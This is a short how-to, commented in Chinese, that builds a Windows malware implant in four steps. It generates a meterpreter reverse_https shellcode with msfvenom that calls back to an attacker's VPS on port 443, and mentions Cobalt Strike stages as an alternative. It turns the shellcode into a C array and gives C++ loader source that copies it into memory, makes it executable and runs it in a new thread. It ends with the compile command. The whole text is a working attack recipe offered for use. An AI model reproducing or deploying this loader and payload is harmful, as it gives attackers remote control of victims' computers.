```bash
# 1) 生成 x64 原始 shellcode（CS 的 payload 用你 listener 的 raw stage 也行）
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[VPS_IP] LPORT=443 \
  -f raw -o stage.bin

# 2) 转成 C 数组
xxd -i stage.bin > stage.h

# 3) 加载器（加载器.cpp）——VirtualAlloc + 逐字节复制 + CreateThread
```

```cpp
#include <windows.h>
#include "stage.h"
int main() {
    LPVOID p = VirtualAlloc(NULL, stage_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (size_t i = 0; i < stage_bin_len; i++) ((unsigned char*)p)[i] = stage_bin[i];
    DWORD old;
    VirtualProtect(p, stage_bin_len, PAGE_EXECUTE_READ, &old);
    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
    WaitForSingleObject(h, INFINITE);
    return 0;
}
```

```bash
# 4) 编译（MSVC x64 Native Tools）
cl /O2 /MT loader.cpp /Fe:loader.exe
```

